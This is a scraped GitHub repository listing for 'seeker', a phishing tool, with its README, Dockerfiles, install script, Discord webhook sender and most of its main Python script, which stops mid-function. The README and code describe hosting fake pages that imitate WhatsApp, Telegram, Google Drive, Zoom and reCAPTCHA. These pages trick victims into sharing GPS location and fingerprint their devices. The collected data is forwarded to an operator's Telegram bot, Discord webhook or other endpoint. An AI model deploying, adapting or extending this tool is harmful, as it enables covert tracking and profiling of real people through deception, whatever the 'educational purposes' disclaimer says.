{
  "metadata": {
    "timestamp": 1736711724080,
    "page": 21,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjMw",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "thewhiteh4t/seeker",
      "stars": 7426,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.03125,
          "content": "db/\nlogs/\ntemplate/__pycache__/\n"
        },
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 0.3232421875,
          "content": "FROM alpine:latest\nRUN apk update \nRUN apk add --no-cache \\\ngit \\\nbash \\\nmusl-dev \\\nlinux-headers \\\npython3 \\\npy3-pip gcc \\\npython3-dev \\\nphp php-json openssh\nRUN pip3 install requests packaging psutil\nWORKDIR /root/seeker\nRUN git clone https://github.com/thewhiteh4t/seeker.git .\nEXPOSE 8080\nENTRYPOINT [\"/root/seeker/seeker.py\"]\n"
        },
        {
          "name": "Dockerfile.dev",
          "type": "blob",
          "size": 0.275390625,
          "content": "FROM alpine:latest\nRUN apk update \nRUN apk add --no-cache \\\ngit \\\nbash \\\nmusl-dev \\\nlinux-headers \\\npython3 \\\npy3-pip gcc \\\npython3-dev \\\nphp php-json openssh\nRUN pip3 install requests packaging psutil\nWORKDIR /root/seeker\nCOPY . .\nEXPOSE 8080\nENTRYPOINT [\"/root/seeker/seeker.py\"]\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.04296875,
          "content": "MIT License\n\nCopyright (c) 2019 thewhiteh4t\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 8.16015625,
          "content": "<p align=\"center\"><img src=\"https://i.imgur.com/DIpuNTI.jpg\"></p>\n\n<p align=\"center\">\n    <a href=\"https://twitter.com/thewhiteh4t\">\n      <img src=\"https://img.shields.io/badge/-TWITTER-black?logo=twitter&style=for-the-badge\">\n    </a>\n    &nbsp;\n    <a href=\"https://twc1rcle.com/\">\n      <img src=\"https://img.shields.io/badge/-THE WHITE CIRCLE-black?logo=&style=for-the-badge\">\n    </a>\n    &nbsp;\n    <a href=\"https://thewhiteh4t.github.io/\">\n      <img src=\"https://img.shields.io/badge/-BLOG-black?logo=dialogflow&style=for-the-badge\">\n    </a>\n</p>\n\n<p align=\"center\">\n  <br>\n  <b>Available in</b>\n  <br>\n  <img src=\"https://i.imgur.com/1wJVDV5.png\">\n</p>\n\n<p>\n  <a style=\"margin-right: 10px;\" href=\"https://github.com/thewhiteh4t/seeker#installation\">\n    <img src=\"https://dabuttonfactory.com/button.png?t=INSTALL&f=Open+Sans&ts=15&tc=000&hp=25&vp=10&c=5&bgt=unicolored&bgc=00e2ff\">\n  </a>\n  <a style=\"margin-right: 10px;\" href=\"https://github.com/thewhiteh4t/seeker#usage\">\n    <img src=\"https://dabuttonfactory.com/button.png?t=USAGE&f=Open+Sans&ts=15&tc=000&hp=25&vp=10&c=5&bgt=unicolored&bgc=00e2ff\">\n  </a>\n  <a href=\"https://github.com/thewhiteh4t/seeker#demo\">\n    <img src=\"https://dabuttonfactory.com/button.png?t=DEMO&f=Open+Sans&ts=15&tc=000&hp=25&vp=10&c=5&bgt=unicolored&bgc=00e2ff\">\n  </a>\n</p>\n\nConcept behind Seeker is simple, just like we host phishing pages to get credentials why not host a fake page that requests your location like many popular location based websites. Read more on <a href=\"https://thewhiteh4t.github.io\"> thewhiteh4t's Blog </a>.Seeker Hosts a fake website which asks for Location Permission and if the target allows it, we can get :\n\n* Longitude\n* Latitude\n* Accuracy\n* Altitude - Not always available\n* Direction - Only available if user is moving\n* Speed - Only available if user is moving\n\nAlong with Location Information we also get **Device Information** without any permissions :\n\n* Unique ID using Canvas Fingerprinting\n* Device Model - Not always available\n* Operating System\n* Platform\n* Number of CPU Cores - Approximate Results\n* Amount of RAM - Approximate Results\n* Screen Resolution\n* GPU information\n* Browser Name and Version\n* Public IP Address\n* Local IP Address\n* Local Port\n\n**Automatic IP Address Reconnaissance** is performed after the above information is received.\n\n**This tool is a Proof of Concept and is for Educational Purposes Only, Seeker shows what data a malicious website can gather about you and your devices and why you should not click on random links and allow critical permissions such as Location etc.**\n\n## How is this Different from IP GeoLocation\n\n* Other tools and services offer IP Geolocation which is NOT accurate at all and does not give location of the target instead it is the approximate location of the ISP.\n\n* Seeker uses HTML API and gets Location Permission and then grabs Longitude and Latitude using GPS Hardware which is present in the device, so Seeker works best with Smartphones, if the GPS Hardware is not present, such as on a Laptop, Seeker fallbacks to IP Geolocation or it will look for Cached Coordinates.  \n\n* Generally if a user accepts location permsission, Accuracy of the information recieved is **accurate to approximately 30 meters**\n\n* Accuracy depends on multiple factors which you may or may not control such as :\n  * Device - Won't work on laptops or phones which have broken GPS\n  * Browser - Some browsers block javascripts\n  * GPS Calibration - If GPS is not calibrated you may get inaccurate results and this is very common\n\n## Templates\n\nAvailable Templates : \n\n* NearYou\n* Google Drive (Suggested by @Akaal_no_one)\n* WhatsApp (Suggested by @Dazmed707)\n* Telegram\n* Zoom (Made by @a7maadf)\n* Google reCAPTCHA (Made by @MrEgyptian)\n\nCreate your own template ! \nSteps to let you create your template is described in this [how-to](./createTemplate.md)\n\nOnce your template is ready, **do not forget to propose it to the community via a PR (pull request)**\n\n## Tested On :\n\n* Kali Linux\n* BlackArch Linux\n* Ubuntu\n* Fedora\n* Kali Nethunter\n* Termux\n* Parrot OS\n* OSX - Monterey v.12.0.1\n\n## Installation\n\n### Kali Linux / Arch Linux / Ubuntu / Fedora / Parrot OS / Termux\n\n```bash\ngit clone https://github.com/thewhiteh4t/seeker.git\ncd seeker/\nchmod +x install.sh\n./install.sh\n```\n\n### BlackArch Linux\n\n```bash\nsudo pacman -S seeker\n```\n\n### Docker\n\n```bash\ndocker pull thewhiteh4t/seeker\n```\n\n### OSX\n```bash\ngit clone https://github.com/thewhiteh4t/seeker.git\ncd seeker/\npython3 seeker.py\n````\n\nIn order to run in tunnel mode, install ngrok by running this command in the terminal:\n```bash\nbrew install ngrok/ngrok/ngrok\n\nngrok http 8080\n````\n\n## Usage\n\n```bash\npython3 seeker.py -h\n\nusage: seeker.py [-h] [-k KML] [-p PORT] [-u] [-v] [-t TEMPLATE] [-d] [--telegram token:chatId] [--webhook WEBHOOK]\n\noptions:\n  -h, --help                            show this help message and exit\n  -k KML, --kml KML                     KML filename\n  -p PORT, --port PORT                  Web server port [ Default : 8080 ]\n  -u, --update                          Check for updates\n  -v, --version                         Prints version\n  -t TEMPLATE, --template TEMPLATE      Auto choose the template with the given index\n  -d, --debugHTTP                       Disable auto http --> https redirection for testing purposes \n                                        (only works for the templates having index_temp.html file)\n  --telegram                            Send info to a telegram bot, provide telegram token and chat to use\n                                        format = token:chatId separated by a colon\n  --webhook                             Send events to a webhook endpoint to be processed\n                                        Note : endpoint must be unauthenticated and accept POST request\n\n#########################\n# Environment Variables #\n#########################\n\nSome of the options above can also be enabled via environment variables, to ease deployment.\nOther parameters can be provided via environment variables to avoid interactive mode.\n\nVariables:\n  DEBUG_HTTP            Same as -d, --debugHTTP\n  PORT                  Same as -p, --port\n  TEMPLATE              Same as -t, --template\n  TITLE                 Provide the group title or the page title\n  REDIRECT              Provide the URL to redirect the user to, after the job is done\n  IMAGE                 Provide the image to use, can either be remote (http or https) or local\n                        Note : Remote image will be downloaded locally during the startup\n  DESC                  Provide the description of the item (group or webpage depending on the template)\n  SITENAME              Provide the name of the website\n  DISPLAY_URL           Provide the URL to display on the page\n  MEM_NUM               Provide the number of group membres (Telegram so far)\n  ONLINE_NUM            Provide the number of the group online members (Telegram so far)\n  TELEGRAM              Provide telegram token and chat to use to send info to a telegram bot\n                        format = token:chatId separated by a colon\n  WEBHOOK               Provide the webhook url to forward the events to \n                        Note : endpoint should be unauthenticated and accept POST method\n                        \n\n##################\n# Usage Examples #\n##################\n\n# Step 1 : In first terminal\n$ python3 seeker.py\n\n# Step 2 : In second terminal start a tunnel service such as ngrok\n$ ./ngrok http 8080\n\n###########\n# Options #\n###########\n\n# Ouput KML File for Google Earth\n$ python3 seeker.py -k <filename>\n\n# Use Custom Port\n$ python3 seeker.py -p 1337\n$ ./ngrok http 1337\n\n# Pre-select a specific template\n$ python3 seeker.py -t 1\n\n################\n# Docker Usage #\n################\n\n# Step 1\n$ docker network create ngroknet\n\n# Step 2\n$ docker run --rm -it --net ngroknet --name seeker thewhiteh4t/seeker\n\n# Step 3\n$ docker run --rm -it --net ngroknet --name ngrok wernight/ngrok ngrok http seeker:8080\n```\n\n## Local Tunnels\nUse\n```\nssh -R 80:localhost:8080 nokey@localhost.run\n```\nas an alterntive to ngrok\n\n## Demo\n\n**YouTube**\n\n<a href=\"https://odysee.com/@thewhiteh4t:2/seeker_v126_demo:e\">\n  <img src=\"https://thumbnails.odycdn.com/optimize/s:1024:768/quality:85/plain/https://thumbs.odycdn.com/5ce9ed06e0ce8a995987dba0949dbc9a.webp\">\n</a>\n"
        },
        {
          "name": "createTemplate.md",
          "type": "blob",
          "size": 1.9287109375,
          "content": "# How-to create template\n\nOnce your template is working perfect, do not forget to submit it to the community via a Pull Request!\n\n## HTML Files\nYou are free to implement any HTML + CSS files to get the look and feel you want, however, do not forget to do the bridge with the core javascript part described in the next section.\n\n## Javascript\nYou can use any JS you need, but to do the link with the core files, ensure you have the following directive on your main html page:\n`<script src=\"js/locate.js\"></script>`\nThis file must not be present, and will be copied by seeker at template startup.\n\nThe `information()` function can be called anywhere, to send browser/computer data (without location).\n\nFor the location, the `location` function must be called (on a button click or another action), it takes two parameters. The first one is the function to call once the location is sent, and the other is the function to call when the user declines location access.\n\n```\n<a class=\"tgme_action_button_new\" onclick=\"locate(popup, function(){$('#change').html('Failed');});\">View in Telegram</a>\nOr for a redirect:\n<button id=\"requestButton\" style=\"font-weight:bold\" class=\"jfk-button jfk-button-action\" onclick=\"locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});\">Request access</button>\n```\n\n## Template files\nThere is a unique `templates.json` file, add another entry to this file, at the end.\n```        \n        ,\n        {\n            \"name\": \"Your template name\",\n            \"dir_name\": \"folder where your template code is\",\n            \"import_file\": \"mod_yourtemplate\"\n        }\n```\n\n## Python file\nIn the `template` folder, you will find a set of mod_*.py file, you can copy and adapt an existing one and report the name in the `templates.json` file described above.\nThis python file is used to replace variables, and prepare files at template startup.\n\n## PHP file\nPHP side is managed by seeker, do not include any PHP file\n"
        },
        {
          "name": "discord_webhook.py",
          "type": "blob",
          "size": 5.2119140625,
          "content": "#!/usr/bin/env python3\n\nimport requests\nfrom json import dumps, loads\n\n\ndef discord_sender(url, msg_type, content):\n    json_str = dumps(content)\n    json_content = loads(json_str)\n    if msg_type == 'device_info':\n        info_message = {\n            \"content\": None,\n            \"embeds\": [\n                {\n                    \"title\": \"Device Information\",\n                    \"color\": 65280,\n                    \"fields\": [\n                        {\n                            \"name\": \"OS\",\n                            \"value\": json_content['os']\n                        },\n                        {\n                            \"name\": \"Platform\",\n                            \"value\": json_content['platform']\n                        },\n                        {\n                            \"name\": \"Browser\",\n                            \"value\": json_content['browser']\n                        },\n                        {\n                            \"name\": \"GPU Vendor\",\n                            \"value\": json_content['vendor']\n                        },\n                        {\n                            \"name\": \"GPU\",\n                            \"value\": json_content['render']\n                        },\n                        {\n                            \"name\": \"CPU Cores\",\n                            \"value\": json_content['cores']\n                        },\n                        {\n                            \"name\": \"RAM\",\n                            \"value\": json_content['ram']\n                        },\n                        {\n                            \"name\": \"Public IP\",\n                            \"value\": json_content['ip']\n                        },\n                        {\n                            \"name\": \"Resolution\",\n                            \"value\": f'{json_content[\"ht\"]}x{json_content[\"wd\"]}'\n                        }\n                    ]\n                }\n            ]\n        }\n        requests.post(url, json=info_message, timeout=10)\n\n    if msg_type == 'ip_info':\n        ip_info_msg = {\n            \"content\": None,\n            \"embeds\": [\n                {\n                    \"title\": \"IP Information\",\n                    \"color\": 65280,\n                    \"fields\": [\n                        {\n                            \"name\": \"Continent\",\n                            \"value\": json_content['continent']\n                        },\n                        {\n                            \"name\": \"Country\",\n                            \"value\": json_content['country']\n                        },\n                        {\n                            \"name\": \"Region\",\n                            \"value\": json_content['region']\n                        },\n                        {\n                            \"name\": \"City\",\n                            \"value\": json_content['city']\n                        },\n                        {\n                            \"name\": \"Org\",\n                            \"value\": json_content['org']\n                        },\n                        {\n                            \"name\": \"ISP\",\n                            \"value\": json_content['isp']\n                        }\n                    ]\n                }\n            ]\n        }\n        requests.post(url, json=ip_info_msg, timeout=10)\n\n    if msg_type == 'location':\n        location_msg = {\n            \"content\": None,\n            \"embeds\": [\n                {\n                    \"title\": \"Location Information\",\n                    \"color\": 65280,\n                    \"fields\": [\n                        {\n                            \"name\": \"Latitude\",\n                            \"value\": json_content['lat']\n                        },\n                        {\n                            \"name\": \"Longitude\",\n                            \"value\": json_content['lon']\n                        },\n                        {\n                            \"name\": \"Accuracy\",\n                            \"value\": json_content['acc']\n                        },\n                        {\n                            \"name\": \"Altitude\",\n                            \"value\": json_content['alt']\n                        },\n                        {\n                            \"name\": \"Direction\",\n                            \"value\": json_content['dir']\n                        },\n                        {\n                            \"name\": \"Speed\",\n                            \"value\": json_content['spd']\n                        }\n                    ]\n                }\n            ]\n        }\n        requests.post(url, json=location_msg, timeout=10)\n\n    if msg_type == 'url':\n        url_msg = {\n            \"content\": json_content['url'],\n            \"embeds\": None,\n            \"attachments\": []\n        }\n        requests.post(url, json=url_msg, timeout=10)\n\n    if msg_type == 'error':\n        error_msg = {\n            \"content\": None,\n            \"embeds\": [\n                {\n                    \"color\": 16711680,\n                    \"fields\": [\n                        {\n                            \"name\": \"Error\",\n                            \"value\": json_content['error']\n                        }\n                    ]\n                }\n            ],\n            \"attachments\": []\n        }\n        requests.post(url, json=error_msg, timeout=10)\n"
        },
        {
          "name": "install.sh",
          "type": "blob",
          "size": 2.541015625,
          "content": "#!/usr/bin/env bash\n\nLOG_DIR=$PWD/logs\nDB_DIR=$PWD/db\nILOG=$LOG_DIR/install.log\n\nmkdir -p $LOG_DIR $DB_DIR\n\nstatus_check() {\n    if [ $? -eq 0 ]\n    then\n        echo -e \"$1 - Installed\"\n    else\n        echo -e \"$1 - Failed!\"\n    fi\n}\n\ndebian_install() {\n    echo -e '=====================\\nINSTALLING FOR DEBIAN\\n=====================\\n' > \"$ILOG\"\n\n    pkgs=\"python3 python3-pip python3-requests python3-packaging python3-psutil php\"\n\n    install_cmd() {\n        echo -ne '$1\\r'\n        sudo apt -y install $1 &>> \"$ILOG\"\n        status_check $1\n        echo -e '\\n--------------------\\n' >> \"$ILOG\"\n    }\n\n    for pkg_name in $pkgs; do\n        install_cmd $pkg_name\n    done\n}\n\nfedora_install() {\n    echo -e '=====================\\nINSTALLING FOR FEDORA\\n=====================\\n' > \"$ILOG\"\n\n    pkgs=\"python3 python3-pip python3-requests python3-packaging python3-psutil php\"\n\n    install_cmd() {\n        echo -ne \"$1\\r\"\n        sudo dnf install $1 -y &>> \"$ILOG\"\n        status_check $1\n        echo -e '\\n--------------------\\n' >> \"$ILOG\"\n    }\n\n    for pkg_name in $pkgs; do\n        install_cmd $pkg_name\n    done\n}\n\ntermux_install() {\n    echo -e '=====================\\nINSTALLING FOR TERMUX\\n=====================\\n' > \"$ILOG\"\n\n    pkgs=\"python php\"\n    pip_pkgs=\"requests packaging psutil\"\n\n    install_cmd() {\n        echo -ne \"$1\\r\"\n        apt -y install $1 &>> \"$ILOG\"\n        status_check $1\n        echo -e '\\n--------------------\\n' >> \"$ILOG\"\n    }\n\n    install_pip() {\n        echo -ne \"$1\\r\"\n        pip install -U $1 &>> \"$ILOG\"\n        status_check $1\n        echo -e '\\n--------------------\\n' >> \"$ILOG\"\n    }\n\n    for pkg_name in $pkgs; do\n        install_cmd $pkg_name\n    done\n\n    for pkg_name in $pip_pkgs; do\n        install_pip $pkg_name\n    done\n}\n\narch_install() {\n    echo -e '=========================\\nINSTALLING FOR ARCH LINUX\\n=========================\\n' > \"$ILOG\"\n\n    install_cmd() {\n        echo -ne \"$1\\r\"\n        yes | sudo pacman -S $1 --needed &>> \"$ILOG\"\n        status_check $1\n        echo -e '\\n--------------------\\n' >> \"$ILOG\"\n    }\n\n    pkgs=\"python3 python-pip python-requests python-packaging python-psutil php\"\n\n    for pkg_name in $pkgs; do\n        install_cmd $pkg_name\n    done\n}\n\necho -e '[!] Installing Dependencies...\\n'\n\nif [ -f '/etc/arch-release' ]; then\n    arch_install\nelif [ -f '/etc/fedora-release' ]; then\n    fedora_install\nelse\n    if [ -z \"${TERMUX_VERSION}\" ]; then\n        debian_install\n    else\n        termux_install\n    fi\nfi\n\necho -e '=========\\nCOMPLETED\\n=========\\n' >> \"$ILOG\"\n\necho -e '\\n[+] Log Saved :' \"$ILOG\"\n"
        },
        {
          "name": "js",
          "type": "tree",
          "content": null
        },
        {
          "name": "metadata.json",
          "type": "blob",
          "size": 0.1474609375,
          "content": "{\n\t\"name\": \"seeker\",\n\t\"author\": \"thewhiteh4t\",\n\t\"version\": \"1.3.1\",\n\t\"twitter\": \"https://twitter.com/thewhiteh4t\",\n\t\"comms\": \"https://twc1rcle.com/\"\n}\n"
        },
        {
          "name": "php",
          "type": "tree",
          "content": null
        },
        {
          "name": "seeker.py",
          "type": "blob",
          "size": 13.0205078125,
          "content": "#!/usr/bin/env python3\n\nVERSION = '1.3.1'\n\nR = '\\033[31m'  # red\nG = '\\033[32m'  # green\nC = '\\033[36m'  # cyan\nW = '\\033[0m'   # white\nY = '\\033[33m'  # yellow\n\nimport sys\nimport utils\nimport argparse\nimport requests\nimport traceback\nimport shutil\nfrom time import sleep\nfrom os import path, kill, mkdir, getenv, environ, remove, devnull\nfrom json import loads, decoder\nfrom packaging import version\n\nparser = argparse.ArgumentParser()\nparser.add_argument('-k', '--kml', help='KML filename')\nparser.add_argument('-p', '--port', type=int, default=8080, help='Web server port [ Default : 8080 ]')\nparser.add_argument('-u', '--update', action='store_true', help='Check for updates')\nparser.add_argument('-v', '--version', action='store_true', help='Prints version')\nparser.add_argument('-t', '--template', type=int, help='Load template and loads parameters from env variables')\nparser.add_argument('-d', '--debugHTTP', type=bool, default=False, help='Disable HTTPS redirection for testing only')\nparser.add_argument('-tg', '--telegram', help='Telegram bot API token [ Format -> token:chatId ]')\nparser.add_argument('-wh', '--webhook', help='Webhook URL [ POST method & unauthenticated ]')\n\nargs = parser.parse_args()\nkml_fname = args.kml\nport = getenv('PORT') or args.port\nchk_upd = args.update\nprint_v = args.version\ntelegram = getenv('TELEGRAM') or args.telegram\nwebhook = getenv('WEBHOOK') or args.webhook\n\nif (getenv('DEBUG_HTTP') and (getenv('DEBUG_HTTP') == '1' or getenv('DEBUG_HTTP').lower() == 'true')) or args.debugHTTP is True:\n\tenviron['DEBUG_HTTP'] = '1'\nelse:\n\tenviron['DEBUG_HTTP'] = '0'\n\ntemplateNum = int(getenv('TEMPLATE')) if getenv('TEMPLATE') and getenv('TEMPLATE').isnumeric() else args.template\n\npath_to_script = path.dirname(path.realpath(__file__))\n\nSITE = ''\nSERVER_PROC = ''\nLOG_DIR = f'{path_to_script}/logs'\nDB_DIR = f'{path_to_script}/db'\nLOG_FILE = f'{LOG_DIR}/php.log'\nDATA_FILE = f'{DB_DIR}/results.csv'\nINFO = f'{LOG_DIR}/info.txt'\nRESULT = f'{LOG_DIR}/result.txt'\nTEMPLATES_JSON = f'{path_to_script}/template/templates.json'\nTEMP_KML = f'{path_to_script}/template/sample.kml'\nMETA_FILE = f'{path_to_script}/metadata.json'\nMETA_URL = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'\nPID_FILE = f'{path_to_script}/pid'\n\nif not path.isdir(LOG_DIR):\n\tmkdir(LOG_DIR)\n\nif not path.isdir(DB_DIR):\n\tmkdir(DB_DIR)\n\n\ndef chk_update():\n\ttry:\n\t\tprint('> Fetching Metadata...', end='')\n\t\trqst = requests.get(META_URL, timeout=5)\n\t\tmeta_sc = rqst.status_code\n\t\tif meta_sc == 200:\n\t\t\tprint('OK')\n\t\t\tmetadata = rqst.text\n\t\t\tjson_data = loads(metadata)\n\t\t\tgh_version = json_data['version']\n\t\t\tif version.parse(gh_version) > version.parse(VERSION):\n\t\t\t\tprint(f'> New Update Available : {gh_version}')\n\t\t\telse:\n\t\t\t\tprint('> Already up to date.')\n\texcept Exception as exc:\n\t\tutils.print(f'Exception : {str(exc)}')\n\n\nif chk_upd is True:\n\tchk_update()\n\tsys.exit()\n\nif print_v is True:\n\tutils.print(VERSION)\n\tsys.exit()\n\nimport socket\nimport importlib\nfrom csv import writer\nimport subprocess as subp\nfrom ipaddress import ip_address\nfrom signal import SIGTERM\n\n# temporary workaround for psutil exception on termux\nwith open(devnull, 'w') as nf:\n\tsys.stderr = nf\n\timport psutil\nsys.stderr = sys.__stderr__\n\n\ndef banner():\n\twith open(META_FILE, 'r') as metadata:\n\t\tjson_data = loads(metadata.read())\n\t\ttwitter_url = json_data['twitter']\n\t\tcomms_url = json_data['comms']\n\n\tart = r'''\n                        __\n  ______  ____   ____  |  | __  ____ _______\n /  ___/_/ __ \\_/ __ \\ |  |/ /_/ __ \\\\_  __ \\\n \\___ \\ \\  ___/\\  ___/ |    < \\  ___/ |  | \\/\n/____  > \\___  >\\___  >|__|_ \\ \\___  >|__|\n     \\/      \\/     \\/      \\/     \\/'''\n\tutils.print(f'{G}{art}{W}\\n')\n\tutils.print(f'{G}[>] {C}Created By   : {W}thewhiteh4t')\n\tutils.print(f'{G} |---> {C}Twitter   : {W}{twitter_url}')\n\tutils.print(f'{G} |---> {C}Community : {W}{comms_url}')\n\tutils.print(f'{G}[>] {C}Version      : {W}{VERSION}\\n')\n\n\ndef send_webhook(content, msg_type):\n\tif webhook is not None:\n\t\tif not webhook.lower().startswith('http://') and not webhook.lower().startswith('https://'):\n\t\t\tutils.print(f'{R}[-] {C}Protocol missing, include http:// or https://{W}')\n\t\t\treturn\n\t\tif webhook.lower().startswith('https://discord.com/api/webhooks'):\n\t\t\tfrom discord_webhook import discord_sender\n\t\t\tdiscord_sender(webhook, msg_type, content)\n\t\telse:\n\t\t\trequests.post(webhook, json=content)\n\n\ndef send_telegram(content, msg_type):\n\tif telegram is not None:\n\t\ttmpsplit = telegram.split(':')\n\t\tif len(tmpsplit) < 3:\n\t\t\tutils.print(f'{R}[-] {C}Telegram API token invalid! Format -> token:chatId{W}')\n\t\t\treturn\n\t\tfrom telegram_api import tgram_sender\n\t\ttgram_sender(msg_type, content, tmpsplit)\n\n\ndef template_select(site):\n\tutils.print(f'{Y}[!] Select a Template :{W}\\n')\n\n\twith open(TEMPLATES_JSON, 'r') as templ:\n\t\ttempl_info = templ.read()\n\n\ttempl_json = loads(templ_info)\n\n\tfor item in templ_json['templates']:\n\t\tname = item['name']\n\t\tutils.print(f'{G}[{templ_json[\"templates\"].index(item)}] {C}{name}{W}')\n\n\ttry:\n\t\tselected = -1\n\t\tif templateNum is not None:\n\t\t\tif templateNum >= 0 and templateNum < len(templ_json['templates']):\n\t\t\t\tselected = templateNum\n\t\telse:\n\t\t\tselected = int(input(f'{G}[>] {W}'))\n\t\tif selected < 0:\n\t\t\tprint()\n\t\t\tutils.print(f'{R}[-] {C}Invalid Input!{W}')\n\t\t\tsys.exit()\n\texcept ValueError:\n\t\tprint()\n\t\tutils.print(f'{R}[-] {C}Invalid Input!{W}')\n\t\tsys.exit()\n\n\ttry:\n\t\tsite = templ_json['templates'][selected]['dir_name']\n\texcept IndexError:\n\t\tprint()\n\t\tutils.print(f'{R}[-] {C}Invalid Input!{W}')\n\t\tsys.exit()\n\n\tprint()\n\tutils.print(f'{G}[+] {C}Loading {Y}{templ_json[\"templates\"][selected][\"name\"]} {C}Template...{W}')\n\n\timp_file = templ_json['templates'][selected]['import_file']\n\timportlib.import_module(f'template.{imp_file}')\n\tshutil.copyfile('php/error.php', f'template/{templ_json[\"templates\"][selected][\"dir_name\"]}/error_handler.php')\n\tshutil.copyfile('php/info.php', f'template/{templ_json[\"templates\"][selected][\"dir_name\"]}/info_handler.php')\n\tshutil.copyfile('php/result.php', f'template/{templ_json[\"templates\"][selected][\"dir_name\"]}/result_handler.php')\n\tjsdir = f'template/{templ_json[\"templates\"][selected][\"dir_name\"]}/js'\n\tif not path.isdir(jsdir):\n\t\tmkdir(jsdir)\n\tshutil.copyfile('js/location.js', jsdir + '/location.js')\n\treturn site\n\n\ndef server():\n\tprint()\n\tport_free = False\n\tutils.print(f'{G}[+] {C}Port : {W}{port}\\n')\n\tutils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')\n\tcmd = ['php', '-S', f'0.0.0.0:{port}', '-t', f'template/{SITE}/']\n\n\twith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n\t\ttry:\n\t\t\tsock.connect(('127.0.0.1', port))\n\t\texcept ConnectionRefusedError:\n\t\t\tport_free = True\n\n\tif not port_free and path.exists(PID_FILE):\n\t\twith open(PID_FILE, 'r') as pid_info:\n\t\t\tpid = int(pid_info.read().strip())\n\t\t\ttry:\n\t\t\t\told_proc = psutil.Process(pid)\n\t\t\t\tutils.print(f'{C}[ {R}✘{C} ]{W}')\n\t\t\t\tutils.print(f'{Y}[!] Old instance of php server found, restarting...{W}')\n\t\t\t\tutils.print(f'{G}[+] {C}Starting PHP Server...{W}', end='')\n\t\t\t\ttry:\n\t\t\t\t\tsleep(1)\n\t\t\t\t\tif old_proc.status() != 'running':\n\t\t\t\t\t\told_proc.kill()\n\t\t\t\t\telse:\n\t\t\t\t\t\tutils.print(f'{C}[ {R}✘{C} ]{W}')\n\t\t\t\t\t\tutils.print(f'{R}[-] {C}Unable to kill php server process, kill manually{W}')\n\t\t\t\t\t\tsys.exit()\n\t\t\t\texcept psutil.NoSuchProcess:\n\t\t\t\t\tpass\n\t\t\texcept psutil.NoSuchProcess:\n\t\t\t\tutils.print(f'{C}[ {R}✘{C} ]{W}')\n\t\t\t\tutils.print(f'{R}[-] {C}Port {W}{port} {C}is being used by some other service.{W}')\n\t\t\t\tsys.exit()\n\telif not port_free and not path.exists(PID_FILE):\n\t\tutils.print(f'{C}[ {R}✘{C} ]{W}')\n\t\tutils.print(f'{R}[-] {C}Port {W}{port} {C}is being used by some other service.{W}')\n\t\tsys.exit()\n\telif port_free:\n\t\tpass\n\n\twith open(LOG_FILE, 'w') as phplog:\n\t\tproc = subp.Popen(cmd, stdout=phplog, stderr=phplog)\n\t\twith open(PID_FILE, 'w') as pid_out:\n\t\t\tpid_out.write(str(proc.pid))\n\n\t\tsleep(3)\n\n\t\ttry:\n\t\t\tphp_rqst = requests.get(f'http://127.0.0.1:{port}/index.html')\n\t\t\tphp_sc = php_rqst.status_code\n\t\t\tif php_sc == 200:\n\t\t\t\tutils.print(f'{C}[ {G}✔{C} ]{W}')\n\t\t\t\tprint()\n\t\t\telse:\n\t\t\t\tutils.print(f'{C}[ {R}Status : {php_sc}{C} ]{W}')\n\t\t\t\tcl_quit()\n\t\texcept requests.ConnectionError:\n\t\t\tutils.print(f'{C}[ {R}✘{C} ]{W}')\n\t\t\tcl_quit()\n\n\ndef wait():\n\tprinted = False\n\twhile True:\n\t\tsleep(2)\n\t\tsize = path.getsize(RESULT)\n\t\tif size == 0 and printed is False:\n\t\t\tutils.print(f'{G}[+] {C}Waiting for Client...{Y}[ctrl+c to exit]{W}\\n')\n\t\t\tprinted = True\n\t\tif size > 0:\n\t\t\tdata_parser()\n\t\t\tprinted = False\n\n\ndef data_parser():\n\tdata_row = []\n\twith open(INFO, 'r') as info_file:\n\t\tinfo_content = info_file.read()\n\tif not info_content or info_content.strip() == '':\n\t\treturn\n\ttry:\n\t\tinfo_json = loads(info_content)\n\texcept decoder.JSONDecodeError:\n\t\tutils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')\n\telse:\n\t\tvar_os = info_json['os']\n\t\tvar_platform = info_json['platform']\n\t\tvar_cores = info_json['cores']\n\t\tvar_ram = info_json['ram']\n\t\tvar_vendor = info_json['vendor']\n\t\tvar_render = info_json['render']\n\t\tvar_res = info_json['wd'] + 'x' + info_json['ht']\n\t\tvar_browser = info_json['browser']\n\t\tvar_ip = info_json['ip']\n\n\t\tdata_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])\n\t\tdevice_info = f'''{Y}[!] Device Information :{W}\n\n{G}[+] {C}OS         : {W}{var_os}\n{G}[+] {C}Platform   : {W}{var_platform}\n{G}[+] {C}CPU Cores  : {W}{var_cores}\n{G}[+] {C}RAM        : {W}{var_ram}\n{G}[+] {C}GPU Vendor : {W}{var_vendor}\n{G}[+] {C}GPU        : {W}{var_render}\n{G}[+] 